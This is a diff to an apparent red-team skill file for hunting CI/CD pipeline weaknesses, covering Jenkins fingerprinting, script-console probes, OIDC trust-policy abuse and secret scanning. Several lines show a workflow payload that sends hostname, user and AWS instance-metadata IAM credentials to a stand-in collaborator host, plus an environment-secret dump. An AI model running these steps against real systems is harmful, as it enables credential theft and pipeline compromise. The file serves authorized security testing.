@@ -4,11 +4,45 @@ description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow in
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [cicd, pipeline, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [cicd, pipeline, hunt, redteam]
+  category: redteam
 ---
 
 # HUNT-CICD — CI/CD Pipeline Security
+
+## When to Use
+
+- Target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo).
+- Build artifacts/images are reachable.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `gh`, `jq`, `trufflehog`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
+curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
+curl --max-time 30 --connect-timeout 10 -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
+for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
+  code=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
+  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
+done
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -122,7 +156,7 @@ cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected
 - run: |
     whoami; hostname; id
     curl --max-time 30 --connect-timeout 10 -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
-    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ | base64 -w0)"
+    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
 ```
 
 **OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
@@ -268,24 +302,6 @@ trufflehog docker --image ORG/IMAGE:latest --only-verified
 
 ---
 
-## Verification
-
-Run this self-test to confirm CI/CD hunting readiness:
-
-1. **.git exposure probe** — confirm git path syntax:
-   PASS: git path syntax
-PASS: git HEAD path syntax
-
-2. **GitHub Actions workflow detection** — confirm workflow path:
-   PASS: workflow path recognized
-
-3. **Jenkinsfile detection** — confirm Jenkinsfile pattern:
-   PASS: Jenkinsfile pattern recognized
-
-All 3 tests verify CI/CD hunting readiness.
-
----
-
 ## Pitfalls
 
 - **Exposed .git/config without object access** — a 200 on `/.git/config` proves the repo is reachable, but without `/.git/objects/` access you can't extract source. Test both paths.
@@ -295,3 +311,13 @@ All 3 tests verify CI/CD hunting readiness.
 - **Container registry misconfig** — public container images may contain build secrets, source code, or credentials. Always pull and inspect the layers.
 - **Artifact poisoning across builds** — if build artifacts are stored without per-build isolation, a previous build's artifacts may be served to the next build.
 - **Masked CI/CD variables** — logging a masked variable inside a heredoc or base64-encoded still leaks it. Test output formats that bypass masking.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
+
+---
